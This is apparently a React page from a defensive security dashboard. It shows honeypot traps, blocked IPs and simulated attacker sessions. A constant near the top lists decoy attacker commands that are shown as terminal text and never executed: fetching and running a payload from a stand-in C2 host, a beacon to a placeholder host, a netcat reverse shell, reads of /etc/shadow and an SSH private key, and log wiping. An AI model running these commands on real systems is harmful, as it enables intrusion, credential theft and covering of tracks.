import { useEffect, useState, useRef } from 'react'
import api, { core, ingest } from '../services/api'

const FAKE_COMMANDS = [
  'cat /etc/shadow',
  'cat /etc/passwd',
  'wget http://c2.example.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh',
  'curl -s http://malicious.example.com/beacon?id=$(hostname)',
  'nc -e /bin/bash 10.0.0.1 4444',
  'ls -la /root/.ssh && cat /root/.ssh/id_rsa',
  'chmod 777 /etc/passwd',
  'sudo su -c "id && whoami"',
  'find / -name "*.pem" -o -name "*.key" 2>/dev/null',
  'rm -rf /var/log/* && history -c',
]

function StatCard({ icon, label, value, color = 'cyan', sub }) {
  const colors = {
    cyan:   'text-[#00F0FF] border-[#00F0FF]/20 bg-[#00F0FF]/5',
    red:    'text-[#FF003C] border-[#FF003C]/20 bg-[#FF003C]/5',
    purple: 'text-purple-400 border-purple-700/30 bg-purple-900/10',
    yellow: 'text-yellow-400 border-yellow-700/30 bg-yellow-900/10',
    green:  'text-[#39FF14] border-[#39FF14]/20 bg-[#39FF14]/5',
  }
  return (
    <div className={`rounded-xl border p-5 ${colors[color]}`}>
      <div className="flex items-center gap-2 mb-2">
        <i className={`ph ${icon} text-lg`} />
        <span className="text-[10px] font-bold uppercase tracking-widest mono-text opacity-70">{label}</span>
      </div>
      <div className="text-3xl font-bold mono-text">{value}</div>
      {sub && <div className="text-[10px] opacity-60 mono-text mt-1">{sub}</div>}
    </div>
  )
}

function TerminalLine({ cmd, index }) {
  const [visible, setVisible] = useState(false)
  useEffect(() => {
    const t = setTimeout(() => setVisible(true), index * 120)
    return () => clearTimeout(t)
  }, [index])
  if (!visible) return null
  return (
    <div className="flex items-start gap-2 text-[11px] font-mono animate-fadeIn">
      <span className="text-[#39FF14] flex-shrink-0">$</span>
      <span className="text-[#E2E8F0] break-all">{cmd}</span>
    </div>
  )
}

export default function HoneypotPage({ liveEvents = [] }) {
  const [state, setState]           = useState(null)
  const [loading, setLoading]       = useState(false)
  const [simulating, setSimulating] = useState(false)
  const [simLog, setSimLog]         = useState([])
  const [selected, setSelected]     = useState(null)
  const [termLines, setTermLines]   = useState([])
  const [datasetAttacks, setDatasetAttacks] = useState([])
  const termRef = useRef(null)

  const fetchState = async () => {
    setLoading(true)
    try {
      const r = await api.get(ingest('/blocked'))
      setState(r.data)
    } catch {}
    setLoading(false)
  }

  useEffect(() => {
    fetchState()
    const t = setInterval(fetchState, 4000)
    // Load real attack rows from dataset
    api.get(core('/api/dataset/rows'))
      .then(r => {
        const attacks = (r.data.rows || []).filter(row => Number(row.attack_detected||0) === 1 || Number(row.privilege_escalation||0) === 1)
        setDatasetAttacks(attacks)
      })
      .catch(() => {})
    // Pre-populate terminal from the raw log corpus — the dataset rows carry no
    // log text, so they cannot fill the terminal.
    api.get(core('/api/dataset/logs'))
      .then(r => setTermLines((r.data.lines || []).slice(0, 10)))
      .catch(() => {})
    return () => clearInterval(t)
  }, [])

  // Auto-scroll terminal
  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight
  }, [termLines])

  const simulateAttack = async () => {
    setSimulating(true)
    setSimLog([])
    setTermLines([])

    const steps = [
      { msg: 'Generating HIGH_RISK attack scenario...', delay: 300 },
      { msg: 'Injecting payload to ingestion service...', delay: 800 },
      { msg: 'Risk engine evaluating threat...', delay: 1400 },
      { msg: 'Response engine triggered...', delay: 2000 },
      { msg: 'Honeypot trap activated!', delay: 2600 },
    ]

    steps.forEach(({ msg, delay }) =>
      setTimeout(() => setSimLog(p => [...p, msg]), delay)
    )

    try {
      // Simulate via backend which delegates to ingestion
      const r = await api.post(core('/api/simulate'), { count: 3 })
      const results = r.data

      // Push real attack rows to ingest
      const attacksToSend = datasetAttacks.slice(0, 3)
      for (const row of attacksToSend) {
        try {
          await api.post(ingest('/ingest'), {
            ip: row.src_ip || '10.0.1.55',
            device: row.name || 'Privilege Escalation',
            request_count: Math.max(
              Number(row.failed_logins||0) * 5 + Number(row.login_attempts||0) * 2 + Number(row.privilege_escalation||0) * 12,
              50
            ),
          })
        } catch {}
      }

      setTimeout(async () => {
        await fetchState()
        // Show real attack log lines in terminal
        const lines = datasetAttacks.map(r => r.raw_log).filter(Boolean).slice(0, 8)
        setTermLines(lines.length > 0 ? lines : FAKE_COMMANDS.slice(0, 6))
        setSimLog(p => [...p, 'Done. Check honeypot entries below.'])
        setSimulating(false)
      }, 3200)
    } catch {
      setSimLog(p => [...p, 'Simulation error — is the backend running?'])
      setSimulating(false)
    }
  }

  const honeypot = Object.entries(state?.honeypot_ips || {})
  const blocked  = Object.entries(state?.blocked_ips  || {})
  const flagged  = Object.entries(state?.flagged_ips  || {})

  const totalInteractions = honeypot.reduce((s, [, h]) => s + (h.interaction_count || 0), 0)
  const allFakeCommands   = honeypot.flatMap(([ip, h]) =>
    (h.fake_data_accessed || []).map(cmd => ({ ip, cmd }))
  )

  return (
    <div className="space-y-8 animate-fadeIn">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-4 pb-6 border-b border-[#1E2D4A]/50">
        <div>
          <h2 className="text-4xl font-bold text-white tracking-tight font-['Rajdhani'] uppercase">
            Honeypot <span className="text-purple-400">Trap</span>
          </h2>
          <p className="text-[#94A3B8] mt-1 mono-text text-sm">
            Deception layer — lure, capture and analyse attacker behaviour in real-time
          </p>
        </div>
        <div className="flex gap-3">
          <button
            onClick={fetchState}
            disabled={loading}
            className="cyber-btn h-11 px-5"
          >
            <i className={`ph ${loading ? 'ph-spinner animate-spin' : 'ph-arrows-clockwise'} text-lg`} />
            Refresh
          </button>
          <button
            onClick={simulateAttack}
            disabled={simulating}
            className="cyber-btn cyber-btn-purple h-11 px-5"
          >
            <i className={`ph ${simulating ? 'ph-spinner animate-spin' : 'ph-bug'} text-lg`} />
            {simulating ? 'Simulating...' : 'Simulate Attack'}
          </button>
        </div>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <StatCard icon="ph-bug"         label="Honeypot Traps"   value={honeypot.length}      color="purple" sub="active lures" />
        <StatCard icon="ph-prohibit"    label="Blocked IPs"      value={blocked.length}       color="red"    sub="auto-blocked" />
        <StatCard icon="ph-flag"        label="Flagged IPs"      value={flagged.length}        color="yellow" sub="under watch" />
        <StatCard icon="ph-cursor-click" label="Interactions"    value={totalInteractions}    color="cyan"   sub="attacker actions" />
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">

        {/* Honeypot Entries */}
        <div className="rounded-xl border border-purple-700/30 bg-[#0D1323]/60 p-5">
          <div className="flex items-center gap-2 mb-4">
            <i className="ph ph-bug text-purple-400 text-base" />
            <span className="text-[11px] font-bold text-[#94A3B8] uppercase tracking-widest mono-text">
              Active Honeypot Traps
            </span>
            <span className="ml-auto text-[10px] text-purple-400 mono-text font-bold">
              {honeypot.length} trapped
            </span>
          </div>

          {honeypot.length === 0 ? (
            <div className="text-center py-10">
              <i className="ph ph-bug text-5xl text-[#1E2D4A]" />
              <p className="text-[#1E2D4A] text-xs mono-text mt-3">No IPs in honeypot yet.<br />Simulate an attack to trigger the trap.</p>
            </div>
          ) : (
            <div className="space-y-3 max-h-80 overflow-y-auto pr-1">
              {honeypot.map(([ip, h]) => (
                <div
                  key={ip}
                  onClick={() => setSelected(selected === ip ? null : ip)}
                  className={`rounded-lg border px-4 py-3 cursor-pointer transition-all mono-text text-xs
                    ${selected === ip
                      ? 'border-purple-500/60 bg-purple-900/20'
                      : 'border-purple-700/30 bg-purple-900/10 hover:border-purple-500/40'}`}
                >
                  <div className="flex items-center justify-between gap-2 flex-wrap">
                    <div className="flex items-center gap-2">
                      <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />
                      <span className="font-bold text-purple-300 text-sm">{ip}</span>
                      <span className="text-[9px] px-1.5 py-0.5 rounded bg-purple-900 border border-purple-700 text-purple-400 uppercase">
                        {h.honeypot_id}
                      </span>
                    </div>
                    <span className="text-[10px] text-purple-400 font-bold">
                      {h.interaction_count} interaction{h.interaction_count !== 1 ? 's' : ''}
                    </span>
                  </div>
                  <div className="text-[#94A3B8] text-[10px] mt-1.5">
                    reason: <span className="text-purple-300">{h.reason}</span>
                  </div>
                  <div className="text-[#94A3B8] text-[10px]">
                    redirected: {new Date(h.redirected_at).toLocaleString()}
                  </div>

                  {/* Expanded fake commands */}
                  {selected === ip && h.fake_data_accessed?.length > 0 && (
                    <div className="mt-3 rounded-lg bg-[#070B14] border border-[#1E2D4A] p-3 space-y-1.5">
                      <div className="text-[9px] text-purple-400 uppercase tracking-widest mb-2 font-bold">
                        Captured attacker commands
                      </div>
                      {h.fake_data_accessed.map((cmd, i) => (
                        <div key={i} className="flex items-start gap-2 font-mono text-[10px]">
                          <span className="text-[#39FF14] flex-shrink-0">$</span>
                          <span className="text-[#E2E8F0] break-all">{cmd}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Simulation Terminal */}
        <div className="rounded-xl border border-[#1E2D4A] bg-[#070B14] p-5 flex flex-col">
          <div className="flex items-center gap-2 mb-4">
            <div className="flex gap-1.5">
              <span className="w-3 h-3 rounded-full bg-[#FF003C]/70" />
              <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
              <span className="w-3 h-3 rounded-full bg-[#39FF14]/70" />
            </div>
            <span className="text-[10px] text-[#94A3B8] mono-text ml-2 uppercase tracking-widest">
              honeypot_terminal — attacker session
            </span>
          </div>

          {/* Sim log */}
          {simLog.length > 0 && (
            <div className="mb-3 space-y-1">
              {simLog.map((l, i) => (
                <div key={i} className="text-[10px] mono-text text-[#00F0FF] flex items-center gap-2">
                  <i className="ph ph-caret-right text-xs" />{l}
                </div>
              ))}
            </div>
          )}

          {/* Fake terminal */}
          <div
            ref={termRef}
            className="flex-1 min-h-[200px] max-h-64 overflow-y-auto space-y-2 font-mono text-[11px]"
          >
            {termLines.length === 0 ? (
              <div className="text-[#1E2D4A] text-xs mono-text text-center pt-10">
                Click "Simulate Attack" to see attacker commands captured by the honeypot
              </div>
            ) : (
              termLines.map((cmd, i) => <TerminalLine key={i} cmd={cmd} index={i} />)
            )}
          </div>

          <div className="mt-3 pt-3 border-t border-[#1E2D4A] flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-[#39FF14] animate-pulse" />
            <span className="text-[10px] text-[#39FF14] mono-text">
              {simulating ? 'Session active — capturing commands...' : 'Session idle — awaiting attacker'}
            </span>
          </div>
        </div>
      </div>

      {/* All captured commands feed */}
      {allFakeCommands.length > 0 && (
        <div className="rounded-xl border border-[#1E2D4A] bg-[#0D1323]/60 p-5">
          <div className="flex items-center gap-2 mb-4">
            <i className="ph ph-terminal-window text-[#00F0FF] text-base" />
            <span className="text-[11px] font-bold text-[#94A3B8] uppercase tracking-widest mono-text">
              All Captured Commands
            </span>
            <span className="ml-auto text-[10px] text-[#00F0FF] mono-text">{allFakeCommands.length} total</span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-2 max-h-64 overflow-y-auto pr-1">
            {allFakeCommands.map(({ ip, cmd }, i) => (
              <div key={i} className="rounded-lg bg-[#070B14] border border-[#1E2D4A] px-3 py-2 font-mono text-[10px]">
                <div className="text-[9px] text-purple-400 mb-1">{ip}</div>
                <div className="flex items-start gap-2">
                  <span className="text-[#39FF14] flex-shrink-0">$</span>
                  <span className="text-[#E2E8F0] break-all">{cmd}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Blocked IPs */}
      {blocked.length > 0 && (
        <div className="rounded-xl border border-[#FF003C]/20 bg-[#FF003C]/5 p-5">
          <div className="flex items-center gap-2 mb-4">
            <i className="ph ph-prohibit text-[#FF003C] text-base" />
            <span className="text-[11px] font-bold text-[#94A3B8] uppercase tracking-widest mono-text">
              Auto-Blocked IPs
            </span>
            <span className="ml-auto text-[10px] text-[#FF003C] mono-text font-bold">{blocked.length} blocked</span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {blocked.map(([ip, b]) => (
              <div key={ip} className="rounded-lg border border-[#FF003C]/30 bg-[#FF003C]/5 px-4 py-3 mono-text text-xs">
                <div className="flex items-center gap-2 mb-1">
                  <span className="w-2 h-2 rounded-full bg-[#FF003C] animate-pulse" />
                  <span className="font-bold text-[#FF003C] text-sm">{ip}</span>
                </div>
                <div className="text-[#94A3B8] text-[10px]">reason: <span className="text-[#E2E8F0]">{b.reason}</span></div>
                <div className="text-[#94A3B8] text-[10px]">blocked: {new Date(b.blocked_at).toLocaleString()}</div>
                <div className="text-[#94A3B8] text-[10px]">expires: {new Date(b.expires_at).toLocaleString()}</div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Dataset attack events — real priv-esc logs */}
      {datasetAttacks.length > 0 && (
        <div className="rounded-xl border border-[#FF003C]/20 bg-[#FF003C]/5 p-5">
          <div className="flex items-center gap-2 mb-4">
            <i className="ph ph-shield-warning text-[#FF003C] text-base" />
            <span className="text-[11px] font-bold text-[#94A3B8] uppercase tracking-widest mono-text">
              Privilege Escalation Events — Dataset ({datasetAttacks.length} attacks)
            </span>
          </div>
          <div className="space-y-2 max-h-64 overflow-y-auto pr-1">
            {datasetAttacks.map((row, i) => {
              const isShell = row.raw_log?.includes('COMMAND=/bin/bash') || row.raw_log?.includes('COMMAND=/bin/sh')
              const isSession = row.raw_log?.toLowerCase().includes('session opened for user root')
              const isFailed = row.raw_log?.toLowerCase().includes('incorrect password')
              const type = isShell ? 'ROOT_SHELL_SPAWN' : isSession ? 'ROOT_SESSION_OPENED' : isFailed ? 'FAILED_SUDO' : 'PRIV_ESC'
              const color = isShell ? '#FF003C' : isSession ? '#FF6B00' : '#FFEA00'
              return (
                <div key={i} className="rounded-lg border px-3 py-2 mono-text text-xs"
                  style={{ borderColor: color+'30', backgroundColor: color+'08' }}>
                  <div className="flex items-center justify-between gap-2 flex-wrap mb-1">
                    <div className="flex items-center gap-2">
                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
                      <span className="font-bold text-[9px] px-1.5 py-0.5 rounded border"
                        style={{ color, borderColor: color+'44', backgroundColor: color+'10' }}>{type}</span>
                      <span className="font-bold" style={{ color }}>{row.actor || 'unknown'}</span>
                    </div>
                    <span className="text-[#94A3B8] text-[10px]">{row.log_timestamp}</span>
                  </div>
                  <code className="text-[9px] text-[#94A3B8] break-all leading-relaxed">{row.raw_log}</code>
                </div>
              )
            })}
          </div>
        </div>
      )}

      {/* Live stream events related to honeypot/blocked */}
      {liveEvents.filter(e => e.status === 'HIGH_RISK' || e.status === 'EXTREME_RISK').length > 0 && (
        <div className="rounded-xl border border-[#1E2D4A] bg-[#0D1323]/60 p-5">
          <div className="flex items-center gap-2 mb-4">
            <i className="ph ph-broadcast text-[#00F0FF] text-base" />
            <span className="text-[11px] font-bold text-[#94A3B8] uppercase tracking-widest mono-text">
              Live Threat Events — Honeypot Candidates
            </span>
            <span className="ml-auto text-[10px] text-[#00F0FF] mono-text">
              {liveEvents.filter(e => e.status === 'HIGH_RISK' || e.status === 'EXTREME_RISK').length} threats
            </span>
          </div>
          <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
            {liveEvents
              .filter(e => e.status === 'HIGH_RISK' || e.status === 'EXTREME_RISK')
              .slice(0, 15)
              .map((ev, i) => {
                const isExtreme = ev.status === 'EXTREME_RISK'
                const color = isExtreme ? '#FF003C' : '#FF6B00'
                const actions = ev.actions || []
                const inHoneypot = actions.includes('redirected_to_honeypot')
                const isBlocked  = actions.includes('blocked')
                return (
                  <div key={i} className="rounded-lg border px-3 py-2.5 mono-text text-xs"
                    style={{ borderColor: color + '30', backgroundColor: color + '08' }}>
                    <div className="flex items-center justify-between gap-2 flex-wrap">
                      <div className="flex items-center gap-2">
                        <span className="w-2 h-2 rounded-full animate-pulse flex-shrink-0" style={{ backgroundColor: color }} />
                        <span className="font-bold" style={{ color }}>{ev.status}</span>
                        <span className="text-[#94A3B8]">{ev.ip}</span>
                        <span className="text-[#1E2D4A]">→</span>
                        <span className="text-[#E2E8F0]">{ev.device}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        {inHoneypot && <span className="text-[9px] font-bold px-1.5 py-0.5 rounded bg-purple-950 text-purple-400 border border-purple-800 uppercase">HONEYPOT</span>}
                        {isBlocked  && <span className="text-[9px] font-bold px-1.5 py-0.5 rounded bg-red-950 text-red-400 border border-red-800 uppercase">BLOCKED</span>}
                        <span className="text-[10px] text-[#94A3B8]">{new Date(ev.timestamp).toLocaleTimeString()}</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-4 mt-1 text-[10px] text-[#94A3B8]">
                      <span>score <span className="font-bold" style={{ color }}>{ev.risk_score?.toFixed(1)}</span></span>
                      <span>ml <span className="text-[#00F0FF]">{ev.ml_score?.toFixed(1)}</span></span>
                      {ev.reason && ev.reason !== 'N/A' && <span className="truncate max-w-[200px]">{ev.reason}</span>}
                    </div>
                  </div>
                )
              })}
          </div>
        </div>
      )}

      {/* How it works */}
      <div className="rounded-xl border border-[#1E2D4A] bg-[#0D1323]/40 p-6">
        <div className="flex items-center gap-2 mb-5">
          <i className="ph ph-info text-[#00F0FF] text-base" />
          <span className="text-[11px] font-bold text-[#94A3B8] uppercase tracking-widest mono-text">How the Honeypot Works</span>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          {[
            { icon: 'ph-activity',         color: 'text-[#00F0FF]', title: 'Risk Scoring',      desc: 'Every inbound event is scored across ML, temporal, spike, log and count signals.' },
            { icon: 'ph-funnel',           color: 'text-yellow-400', title: 'Tier Classification', desc: 'HIGH_RISK (35–60) triggers honeypot redirect. EXTREME_RISK (60+) also auto-blocks.' },
            { icon: 'ph-bug',              color: 'text-purple-400', title: 'Trap Activated',    desc: 'Attacker IP is silently redirected to a fake environment with decoy credentials and files.' },
            { icon: 'ph-magnifying-glass', color: 'text-[#39FF14]', title: 'Command Capture',   desc: 'Every command the attacker runs is logged — revealing TTPs, tools and intent.' },
          ].map(({ icon, color, title, desc }) => (
            <div key={title} className="flex flex-col gap-2">
              <i className={`ph ${icon} text-2xl ${color}`} />
              <div className="text-sm font-bold text-[#E2E8F0] font-['Rajdhani'] uppercase">{title}</div>
              <div className="text-[11px] text-[#94A3B8] mono-text leading-relaxed">{desc}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
